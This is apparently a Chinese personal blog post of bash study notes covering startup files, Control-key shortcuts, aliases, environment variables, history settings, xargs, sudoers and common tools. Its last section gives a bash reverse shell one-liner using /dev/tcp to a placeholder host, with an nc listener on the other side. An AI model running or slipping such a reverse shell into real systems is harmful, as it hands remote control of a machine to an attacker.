---
title: Bash学习小计
date: 2016-08-05 08:09:15
tags: [Linux, Shell, 小计]
---
最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。
# Shell是什么？
shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。
另外可以在/etc/shells文件里查看当前系统支持的shell。
bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。
<!--more-->
# Bash启动顺序
1./etc/profile :此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。并从/etc/profile.d目录的配置文件中搜集shell的设置。
2.~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。
3.~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。
4.~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件。

注意

```
~/.bash_profile 是交互式、login 方式进入 bash 运行的
~/.bashrc 是交互式 non-login 方式进入 bash 运行的
通常二者设置大致相同，所以通常前者会调用后者。
```
所以我们通常会吧环境变量的一些设置保存在~/.bash_profile中，把一些命令行，脚本调用写到~/.bashrc里面

# Bash快捷键
## 用好你的Control键
Control键是所有类Unix系统（Mac, Linux）下一个非常有用的按键，但也是一个经常被忽视的按键，特别是在Mac平台下，Command键完全代替了在Windows平台下的Ctrl键，很多人不清楚为什么Apple又额外加了一个Control键，我想这和著名的Emacs编辑器有关，Emacs下有很多方便的快捷键，其中很多都需要用到Control键，Mac系统就原生继承了很多这些快捷键，下面就根据我在实际开发过程中遇到的具体情况来总结一下如何用好Control键，效率真能提高不少。
### Control的常用组合键

移动类
 > * Control-F 前进光标 (效果同右方向键)
 > * Control-B 后退光标（效果同左方向键)
 > * Control-P 光标上移（效果同上方向键）
 > * Control-N 光标下移（效果同下方向键）
 > * Control-A 光标移动到行首
 > * Control-E 光标移动到行尾
 
 删除类

 > * Control-D 删除光标后面的一个字符
 > * Control-H 删除光标前面的一个字符
 > * Control-K 删除当前行光标以后的所有字符
 > * Control-W 删除光标前的一个单词
 > * Control-U 删除当前行的所有字符
其它类

 > * Control-T 交换光标两边的字符
 > * Control-L 清屏(仅适用于终端下)
### 一些常用场景

1. 通常情况下，上下左右键都远离主键盘区，如果在你高速打字的过程中需要移动输入光标位置，这个时候直接通过上下左右键就不得不将右手移出主键盘区，就会降低输入的速度，通常这个时候你就可以通过Control的组合键达到快速移动光标的目的。再比如你在一些IDE(Xcode,Android Studio等)里面选择代码补全的不同候选项时，就可以通过Control-P与Control-N来达到切换选择不同候选项的操作.

2. Mac的键盘上没有Home与End键, 如果你想将光标快速移动到行首与行尾就比较麻烦(当然你可以通过Command与-> 或Command与<-实现,但这样你又需要去操作方向键, 方向键远离主键盘区, 速度势必会降低), 这时你就可以通过Control-A 与 Control-E实现, 这两个组合键非常适合在终端下使用

3. 有些时候你在终端下输入了很长的命令, 但发现输入有误, 需要完全删除重新输入, 通常情况下你都会使用Delete键去做, 但Delete只能一次删除一个字符, 速度很慢, 这时你就可以通过Control-U键快速的达到清除当前所有输入的目的, 再比如你当前的输入只有从中间某个位置向后是错误的, 这时你可以通过Control-B或Control-F将光标移动到对应位置, 然后再利用Control-K快速达到删除当前光标后所有输入的目的

4. 在输入的过程中如果发现个别字符不对需要删除重新输入, 你当然可以通过Delete键达到, 但 Delete键和方向键一样有点远, 更方便的你可以通过Control-D 与 Control-H实现, 还有些时候错的不是一个或几个字符,而是一个或几个单词你可以Control-W达到

5. 在终端下如何清屏? 很多人都是通过输入clear达到, 但如果这时你终端里正输入的有一条待执行的命令,这条命令的输出可能有很多你想清一下屏后再执行, 你怎么办,总不能删除当前命令后再输入clear命令, 然后再重新输入刚才的那条命令吧, 其实这时你可以通过Control-L组合键达到目的,这个差不多是我在终端下用的最多的一个快捷键了.

### 关于编辑模式的设置
在交互式执行bash中，可以通过set -o的方式查看当前编辑模式，我们通常采用set -o emaces的方式设置以上快捷键为可操作，需要注意的是，如果你不选择一种快捷键设置"set +o emaces"你连最熟悉的上下键切换history命令都用不了。

## Alias
bash的一个将长命令替换为短命令的方式，可以直接在bash交互执行中输入alias查看已经被设置的快捷键，以`alias la='ls -al'`的方式设置快捷键，当然直接键入命令只对当前打开的shell有效，如果想长期生效，我们通常的做法是把它写到/etc/profile.d/目录下的shell里面，会被/etc/profile调用的一个全局配置。当然在工作环境中我们会把它配到home目录下（因为/etc目录下会对所有用户生效，想想也是不科学的）所以我们更经常写到~/.bashrc里面。

# 关于环境变量
bash的环境变量可以用`set` `env` 两种方式查看，这里主要说一下两种变量的区别，当你在命令行中用赋值的方式申明一个变量，(example: TEXT=123)，这个变量只存在set中，即当前shell生效，不会传递到subshell里面，如果是文本执行的脚本，这种变量申明方式定义的变量也只会在文件内生效，如果想让别的脚本调用这些变量,可以通过export的方式将变量导入到env里面，可以理解为全局变量。
这里我还想提一个比较有意思的环境变量PS1，你可以将它设置为`export PS1="(\!) \[\e[31m\] \[\A\] \[\e[32m\]\u@\h \[\e[34m\]\w \[\e[30m\]$"`试一下，是个非常有意思的值。

# Windows和Linux脚本的转换问题
我们都知道windows和Linux的文件类型不同，那么在windows下编写的脚本如何在Linux下执行呢？当我们从windows下拷贝一个文件到Linux上，可以使用`cat -A`命令查看到文件隐藏字符，发现有很多脏数据，于是可以用`dos2unix file.sh`的方式把文件转化过来。

# 关于历史命令
history可以查看当前用户的历史命令，每个用户的history藏在~/.bash_hitory下，可以查看。
可以使用`!!`执行上一条命令 `![number]`执行第number条命令，`！[string]`执行以string开头的上一条命令
另外control+r可以根据字符串快捷搜索历史命令.

# 关于参数传递
1. `` $()
	这两种方式是相同的，即重新打开一个shell执行完退出，并使用返回值代替脚本调用部分内容
2. | xargs 区别于管道符，是将前面的命令作为后面命令的命令参数，而管道符是将前面输出作为后面命令的标准输入。
	再解释一 | 和 | xargs 的区别：
	
	```
	echo -l | ls 输出： 等同于 ls
	echo -l | xargs ls 输出 等同于 ls -l
	```
	好了，剩下的自己体会。
3. find 的 -exec
	xargs有个缺点，在大量执行命令（成千上万）的时候可能因为执行的命令过多失败，而find的-exec 是为逐个命令执行，不会遇到此类问题，作为-exec的标配，应该在后面加上{} \;末尾的\;其实是转意，恩，此处按下不表。

# 关于文件查找
find 是一个事实文件便利工具，比较强大,可以用` find / -name "*.sh"`的方式查找/中包含.sh结尾的文件，如果遇到一堆permission deny的问题可以用输出重定向的方式解决`find /-name "*.sh" 2>> /dev/null `（2为文件状态符，0表示标准输入，1表示标准输出，2表示错误输出，>>为重定向，表示将输出叠加导入到后面的文件中,/dev/null为Linux系统的垃圾桶）,这个命令比较常用，但是效率很低，占用内存也比较高，推荐使用locate命令，类似于window系统里的everything，将文件信息保存在/var/lib/mlocate/mlocatedb数据库里，使用`updatedb`更新数据库，`locate filename`的方式查找文件，更高效，速度也更快。

# 关于bash_history
放一个bash_histroy的命令：[http://rockhong.github.io/history-in-bash.html](http://rockhong.github.io/history-in-bash.html)
bash使用的历史命令会先写入内存（在退出subshell之前在.bash_history中不可见，也不可传递到子进程），在退出shell的时候写入子进程。这里说几个对bash_history的需求以及解决方案。
## 多个终端不覆盖history:
如果同一用户在不同终端登录，bash_histroy只能保存最后一个用户登录的bash_histroy，解决这个问题：
简单来说，你在.bashrc里面添加这句就够了：

```
shopt -s histappend
```
## history上限设大：

```
# 设置历史记录条数
export HISTFILESIZE=40000000
# 设置显示历史记录条数
export HISTSIZE=10000
```
## history定期备份
很多情况下我们希望保存更多的bash_history以方便以后查阅，但是如果把.bash_history设置得很大的话，bash在启动时会占用大量内存（100000条大概要10M），这是我们不想看到的，所以应该养成定期备份的习惯，推荐把bash_histroy按时间备份比如每天+data>>bash_histroy.back.

# 关于sudo
这里我要说的是用户切换
大家都知道su命令是用来切换用户的，su - 可以完全切换到用户（新开一个shell，加载~/.bash_profile及~/.bashrc），但是在有的情况下，sudo -iu 也可以切换用户。
首先：`sudo -i` 是以root身份新开一个shell，`sudo -u <user> <command>`是以user身份执行command，现在我要说一条神奇的命令：

```
sudo -iu <user> 
```
它等价于`sudo -u root <user_shell>`
是不是很神奇？
我们来看一个更神奇的:
visudo(当然需要root身份或者sudo权限)，编辑/etc/sudoers（或者/etc/sudoers.d/文件下的文件），添加如下代码：

```
user1 ALL=(user2) NOPASSWD: <user_shell>
```
就可以让user1免密码sudo到user2，是不是很有趣。
顺便说一下你可以使用这个配置来管理所有sudo权限。

# 另外记几个Linux下的常用工具

```
1. tldr 查看文档用的，安装比较复杂，而且是联网查找，虚拟机上速度可能会比较慢
sudo yum -y install epel-release
sudo yum -y install python-pip
pip install --upgrade pip
pip install tldr
2. tmux 据说是screen的进阶版，分屏用的
3. lsof端口查看
4. nc网络瑞士军刀，占用端口:nc -k -l -p 8080 2>> /dev/null
5. shudown 可以定时关机，重启，取消关机
6. pstree 进程树
7. grep 逐行扫描文件
8. wc 统计
9. top 查看内存等信息
10. rpm 包管理（二进制包）
11. sl 仅仅是为了好玩，小火车开过。。
12. cmatrix 也是为了好玩，黑客帝国
```
# 最后说一下Bash和Zsh哪个好
当然是Zsh好啦，具体怎么好，你不需要太知道，总之Zsh比Bash很多地方都要强大，在Bash的基础上增加了一些配置。。

# 记一个Bash遇到的小坑
Bash的变量只会被扫描替换一遍，所以当我们的变量里包含其他变量我们需要扫描两遍需要使用eval，类似于python的eval()将字符串当做表达式，用法如下：

```
#!/bin/sh

s=Start
Start_ops=hello
name=$1
echo "$s""_ops"
eval echo \$"$s"_ops "$name"

```
运行 ./test.sh world 
打印出hello word

**但是！！**我现在要说的是请不要使用这种方式，因为邪恶的eval会引起bash注入的问题，就提示到这里，剩下的自己感受。。
# 推荐一个Linux命令查询的网站

[http://man.linuxde.net/](http://man.linuxde.net/)

# 再列一堆Linux下贼好用的工具
[https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67](https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67)

另外： 后面还得写一个关于vim的快捷操作的文章。

# Bash 反弹Shell

```
bash -i >& /dev/tcp/x.x.x.x/2333 0>&1
# 然后在x.x.x.x这台server上执行：
nc -l 2333
```

